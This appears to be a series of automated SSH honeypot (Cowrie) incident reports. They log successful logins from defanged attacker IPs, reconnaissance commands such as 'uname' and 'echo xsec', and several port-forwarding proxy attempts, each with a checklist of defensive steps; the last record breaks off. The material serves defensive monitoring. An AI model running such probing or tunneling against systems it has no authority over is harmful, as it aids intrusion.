
### 🔴 HIGH · IR-274c3b614297

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]26` |
| **First Seen** | 2026-08-16 18:15 |
| **Last Seen** | 2026-08-16 18:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:15:47` | `cowrie.session.connect` |
| `2026-08-16 18:15:47` | `cowrie.client.version` |
| `2026-08-16 18:15:47` | `cowrie.client.kex` |
| `2026-08-16 18:15:48` | `cowrie.login.success` |
| `2026-08-16 18:15:48` | `cowrie.session.params` |
| `2026-08-16 18:15:48` | `cowrie.command.input` |
| `2026-08-16 18:15:49` | `cowrie.log.closed` |
| `2026-08-16 18:15:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]26` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19af915550ff

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]26` |
| **First Seen** | 2026-08-16 18:17 |
| **Last Seen** | 2026-08-16 18:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:17:48` | `cowrie.session.connect` |
| `2026-08-16 18:17:48` | `cowrie.client.version` |
| `2026-08-16 18:17:48` | `cowrie.client.kex` |
| `2026-08-16 18:17:48` | `cowrie.login.success` |
| `2026-08-16 18:17:49` | `cowrie.session.params` |
| `2026-08-16 18:17:49` | `cowrie.command.input` |
| `2026-08-16 18:17:49` | `cowrie.log.closed` |
| `2026-08-16 18:17:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]26` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0dde7aa4eed

| Field | Detail |
|---|---|
| **Source IP** | `185.74.59[.]14` |
| **First Seen** | 2026-08-16 18:18 |
| **Last Seen** | 2026-08-16 18:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:18:01` | `cowrie.session.connect` |
| `2026-08-16 18:18:01` | `cowrie.client.version` |
| `2026-08-16 18:18:01` | `cowrie.client.kex` |
| `2026-08-16 18:18:01` | `cowrie.login.success` |
| `2026-08-16 18:18:02` | `cowrie.session.params` |
| `2026-08-16 18:18:02` | `cowrie.command.input` |
| `2026-08-16 18:18:02` | `cowrie.log.closed` |
| `2026-08-16 18:18:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.74.59[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.74.59[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b975e412ca84

| Field | Detail |
|---|---|
| **Source IP** | `138.118.213[.]68` |
| **First Seen** | 2026-08-16 18:18 |
| **Last Seen** | 2026-08-16 18:18 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:18:51` | `cowrie.session.connect` |
| `2026-08-16 18:18:52` | `cowrie.client.version` |
| `2026-08-16 18:18:52` | `cowrie.client.kex` |
| `2026-08-16 18:18:54` | `cowrie.login.success` |
| `2026-08-16 18:18:55` | `cowrie.direct-tcpip.request` |
| `2026-08-16 18:18:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.118.213[.]68` to AbuseIPDB if not already reported
- [ ] Block `138.118.213[.]68` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f23e085479f4

| Field | Detail |
|---|---|
| **Source IP** | `196.219.93[.]98` |
| **First Seen** | 2026-08-16 18:19 |
| **Last Seen** | 2026-08-16 18:19 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:19:04` | `cowrie.session.connect` |
| `2026-08-16 18:19:05` | `cowrie.client.version` |
| `2026-08-16 18:19:05` | `cowrie.client.kex` |
| `2026-08-16 18:19:06` | `cowrie.login.success` |
| `2026-08-16 18:19:06` | `cowrie.direct-tcpip.request` |
| `2026-08-16 18:19:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.219.93[.]98` to AbuseIPDB if not already reported
- [ ] Block `196.219.93[.]98` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b1a3743be2d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]26` |
| **First Seen** | 2026-08-16 18:19 |
| **Last Seen** | 2026-08-16 18:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:19:42` | `cowrie.session.connect` |
| `2026-08-16 18:19:42` | `cowrie.client.version` |
| `2026-08-16 18:19:43` | `cowrie.client.kex` |
| `2026-08-16 18:19:43` | `cowrie.login.success` |
| `2026-08-16 18:19:44` | `cowrie.session.params` |
| `2026-08-16 18:19:44` | `cowrie.command.input` |
| `2026-08-16 18:19:44` | `cowrie.log.closed` |
| `2026-08-16 18:19:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]26` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2c4ab929cbc

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]26` |
| **First Seen** | 2026-08-16 18:21 |
| **Last Seen** | 2026-08-16 18:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:21:31` | `cowrie.session.connect` |
| `2026-08-16 18:21:31` | `cowrie.client.version` |
| `2026-08-16 18:21:31` | `cowrie.client.kex` |
| `2026-08-16 18:21:32` | `cowrie.login.success` |
| `2026-08-16 18:21:32` | `cowrie.session.params` |
| `2026-08-16 18:21:32` | `cowrie.command.input` |
| `2026-08-16 18:21:32` | `cowrie.log.closed` |
| `2026-08-16 18:21:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]26` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad2e33f85a89

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]26` |
| **First Seen** | 2026-08-16 18:23 |
| **Last Seen** | 2026-08-16 18:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:23:27` | `cowrie.session.connect` |
| `2026-08-16 18:23:27` | `cowrie.client.version` |
| `2026-08-16 18:23:27` | `cowrie.client.kex` |
| `2026-08-16 18:23:27` | `cowrie.login.success` |
| `2026-08-16 18:23:28` | `cowrie.session.params` |
| `2026-08-16 18:23:28` | `cowrie.command.input` |
| `2026-08-16 18:23:28` | `cowrie.log.closed` |
| `2026-08-16 18:23:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]26` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-053d6e1eab56

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]26` |
| **First Seen** | 2026-08-16 18:25 |
| **Last Seen** | 2026-08-16 18:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:25:21` | `cowrie.session.connect` |
| `2026-08-16 18:25:21` | `cowrie.client.version` |
| `2026-08-16 18:25:21` | `cowrie.client.kex` |
| `2026-08-16 18:25:21` | `cowrie.login.success` |
| `2026-08-16 18:25:22` | `cowrie.session.params` |
| `2026-08-16 18:25:22` | `cowrie.command.input` |
| `2026-08-16 18:25:22` | `cowrie.log.closed` |
| `2026-08-16 18:25:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]26` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbabe74af113

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]26` |
| **First Seen** | 2026-08-16 18:27 |
| **Last Seen** | 2026-08-16 18:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:27:11` | `cowrie.session.connect` |
| `2026-08-16 18:27:11` | `cowrie.client.version` |
| `2026-08-16 18:27:11` | `cowrie.client.kex` |
| `2026-08-16 18:27:12` | `cowrie.login.success` |
| `2026-08-16 18:27:12` | `cowrie.session.params` |
| `2026-08-16 18:27:12` | `cowrie.command.input` |
| `2026-08-16 18:27:12` | `cowrie.log.closed` |
| `2026-08-16 18:27:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]26` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37478e85bc63

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
| **First Seen** | 2026-08-16 18:27 |
| **Last Seen** | 2026-08-16 18:28 |
| **Session Duration** | 46s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:27:27` | `cowrie.session.connect` |
| `2026-08-16 18:27:34` | `cowrie.client.version` |
| `2026-08-16 18:27:34` | `cowrie.client.kex` |
| `2026-08-16 18:27:56` | `cowrie.login.success` |
| `2026-08-16 18:28:09` | `cowrie.session.params` |
| `2026-08-16 18:28:09` | `cowrie.command.input` |
| `2026-08-16 18:28:14` | `cowrie.log.closed` |
| `2026-08-16 18:28:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc2609ddfcd7

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]26` |
| **First Seen** | 2026-08-16 18:29 |
| **Last Seen** | 2026-08-16 18:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:29:06` | `cowrie.session.connect` |
| `2026-08-16 18:29:06` | `cowrie.client.version` |
| `2026-08-16 18:29:06` | `cowrie.client.kex` |
| `2026-08-16 18:29:07` | `cowrie.login.success` |
| `2026-08-16 18:29:07` | `cowrie.session.params` |
| `2026-08-16 18:29:07` | `cowrie.command.input` |
| `2026-08-16 18:29:07` | `cowrie.log.closed` |
| `2026-08-16 18:29:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]26` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c34cef9f67a8

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-16 18:29 |
| **Last Seen** | 2026-08-16 18:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:29:46` | `cowrie.session.connect` |
| `2026-08-16 18:29:46` | `cowrie.client.version` |
| `2026-08-16 18:29:46` | `cowrie.client.kex` |
| `2026-08-16 18:29:47` | `cowrie.login.success` |
| `2026-08-16 18:29:48` | `cowrie.session.params` |
| `2026-08-16 18:29:48` | `cowrie.command.input` |
| `2026-08-16 18:29:48` | `cowrie.log.closed` |
| `2026-08-16 18:29:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a801b29257d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]26` |
| **First Seen** | 2026-08-16 18:31 |
| **Last Seen** | 2026-08-16 18:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:31:08` | `cowrie.session.connect` |
| `2026-08-16 18:31:08` | `cowrie.client.version` |
| `2026-08-16 18:31:08` | `cowrie.client.kex` |
| `2026-08-16 18:31:08` | `cowrie.login.success` |
| `2026-08-16 18:31:09` | `cowrie.session.params` |
| `2026-08-16 18:31:09` | `cowrie.command.input` |
| `2026-08-16 18:31:09` | `cowrie.log.closed` |
| `2026-08-16 18:31:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]26` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-577a772249ad

| Field | Detail |
|---|---|
| **Source IP** | `50.188.204[.]213` |
| **First Seen** | 2026-08-16 18:31 |
| **Last Seen** | 2026-08-16 18:32 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:31:55` | `cowrie.session.connect` |
| `2026-08-16 18:31:56` | `cowrie.client.version` |
| `2026-08-16 18:31:56` | `cowrie.client.kex` |
| `2026-08-16 18:31:59` | `cowrie.login.success` |
| `2026-08-16 18:32:01` | `cowrie.direct-tcpip.request` |
| `2026-08-16 18:32:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.188.204[.]213` to AbuseIPDB if not already reported
- [ ] Block `50.188.204[.]213` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04d540244d93

| Field | Detail |
|---|---|
| **Source IP** | `170.233.29[.]175` |
| **First Seen** | 2026-08-16 18:32 |
| **Last Seen** | 2026-08-16 18:32 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:32:08` | `cowrie.session.connect` |
| `2026-08-16 18:32:09` | `cowrie.client.version` |
| `2026-08-16 18:32:09` | `cowrie.client.kex` |
| `2026-08-16 18:32:13` | `cowrie.login.success` |
| `2026-08-16 18:32:15` | `cowrie.direct-tcpip.request` |
| `2026-08-16 18:32:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.233.29[.]175` to AbuseIPDB if not already reported
- [ ] Block `170.233.29[.]175` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bdecfcf280d9

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]26` |
| **First Seen** | 2026-08-16 18:33 |
| **Last Seen** | 2026-08-16 18:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:33:02` | `cowrie.session.connect` |
| `2026-08-16 18:33:02` | `cowrie.client.version` |
| `2026-08-16 18:33:02` | `cowrie.client.kex` |
| `2026-08-16 18:33:03` | `cowrie.login.success` |
| `2026-08-16 18:33:04` | `cowrie.session.params` |
| `2026-08-16 18:33:04` | `cowrie.command.input` |
| `2026-08-16 18:33:04` | `cowrie.log.closed` |
| `2026-08-16 18:33:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]26` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62d3313c8310

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]26` |
| **First Seen** | 2026-08-16 18:34 |
| **Last Seen** | 2026-08-16 18:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:34:58` | `cowrie.session.connect` |
| `2026-08-16 18:34:58` | `cowrie.client.version` |
| `2026-08-16 18:34:58` | `cowrie.client.kex` |
| `2026-08-16 18:34:58` | `cowrie.login.success` |
| `2026-08-16 18:34:59` | `cowrie.session.params` |
| `2026-08-16 18:34:59` | `cowrie.command.input` |
| `2026-08-16 18:34:59` | `cowrie.log.closed` |
| `2026-08-16 18:34:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]26` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be37dcfa08d0

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-16 18:36 |
| **Last Seen** | 2026-08-16 18:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:36:10` | `cowrie.session.connect` |
| `2026-08-16 18:36:10` | `cowrie.client.version` |
| `2026-08-16 18:36:10` | `cowrie.client.kex` |
| `2026-08-16 18:36:10` | `cowrie.login.success` |
| `2026-08-16 18:36:10` | `cowrie.direct-tcpip.request` |
| `2026-08-16 18:36:10` | `cowrie.direct-tcpip.data` |
| `2026-08-16 18:36:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59f02f3496a5

| Field | Detail |
|---|---|
| **Source IP** | `60.166.8[.]174` |
| **First Seen** | 2026-08-16 18:36 |
| **Last Seen** | 2026-08-16 18:36 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:36:17` | `cowrie.session.connect` |
| `2026-08-16 18:36:18` | `cowrie.client.version` |
| `2026-08-16 18:36:18` | `cowrie.client.kex` |
| `2026-08-16 18:36:21` | `cowrie.login.success` |
| `2026-08-16 18:36:22` | `cowrie.direct-tcpip.request` |
| `2026-08-16 18:36:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.166.8[.]174` to AbuseIPDB if not already reported
- [ ] Block `60.166.8[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54ba1cff27ac

| Field | Detail |
|---|---|
| **Source IP** | `85.152.57[.]60` |
| **First Seen** | 2026-08-16 18:36 |
| **Last Seen** | 2026-08-16 18:36 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:36:28` | `cowrie.session.connect` |
| `2026-08-16 18:36:29` | `cowrie.client.version` |
| `2026-08-16 18:36:29` | `cowrie.client.kex` |
| `2026-08-16 18:36:30` | `cowrie.login.success` |
| `2026-08-16 18:36:30` | `cowrie.direct-tcpip.request` |
| `2026-08-16 18:36:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.152.57[.]60` to AbuseIPDB if not already reported
- [ ] Block `85.152.57[.]60` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16ee0831228b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]26` |
| **First Seen** | 2026-08-16 18:36 |
| **Last Seen** | 2026-08-16 18:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:36:56` | `cowrie.session.connect` |
| `2026-08-16 18:36:56` | `cowrie.client.version` |
| `2026-08-16 18:36:56` | `cowrie.client.kex` |
| `2026-08-16 18:36:56` | `cowrie.login.success` |
| `2026-08-16 18:36:57` | `cowrie.session.params` |
| `2026-08-16 18:36:57` | `cowrie.command.input` |
| `2026-08-16 18:36:57` | `cowrie.log.closed` |
| `2026-08-16 18:36:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]26` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-464faa6964fc

| Field | Detail |
|---|---|
| **Source IP** | `69.126.144[.]30` |
| **First Seen** | 2026-08-16 18:37 |
| **Last Seen** | 2026-08-16 18:37 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:37:06` | `cowrie.session.connect` |
| `2026-08-16 18:37:07` | `cowrie.client.version` |
| `2026-08-16 18:37:07` | `cowrie.client.kex` |
| `2026-08-16 18:37:08` | `cowrie.login.success` |
| `2026-08-16 18:37:08` | `cowrie.direct-tcpip.request` |
| `2026-08-16 18:37:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.126.144[.]30` to AbuseIPDB if not already reported
- [ ] Block `69.126.144[.]30` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f646acff1f17

| Field | Detail |
|---|---|
| **Source IP** | `69.126.144[.]30` |
| **First Seen** | 2026-08-16 18:37 |
| **Last Seen** | 2026-08-16 18:37 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:37:13` | `cowrie.session.connect` |
| `2026-08-16 18:37:13` | `cowrie.client.version` |
| `2026-08-16 18:37:13` | `cowrie.client.kex` |
| `2026-08-16 18:37:15` | `cowrie.login.success` |
| `2026-08-16 18:37:15` | `cowrie.direct-tcpip.request` |
| `2026-08-16 18:37:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.126.144[.]30` to AbuseIPDB if not already reported
- [ ] Block `69.126.144[.]30` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9220c42f0efe

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]26` |
| **First Seen** | 2026-08-16 18:38 |
| **Last Seen** | 2026-08-16 18:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:38:50` | `cowrie.session.connect` |
| `2026-08-16 18:38:50` | `cowrie.client.version` |
| `2026-08-16 18:38:50` | `cowrie.client.kex` |
| `2026-08-16 18:38:50` | `cowrie.login.success` |
| `2026-08-16 18:38:51` | `cowrie.session.params` |
| `2026-08-16 18:38:51` | `cowrie.command.input` |
| `2026-08-16 18:38:51` | `cowrie.log.closed` |
| `2026-08-16 18:38:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]26` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54a68e44505b

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:38 |
| **Last Seen** | 2026-08-16 18:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:38:59` | `cowrie.session.connect` |
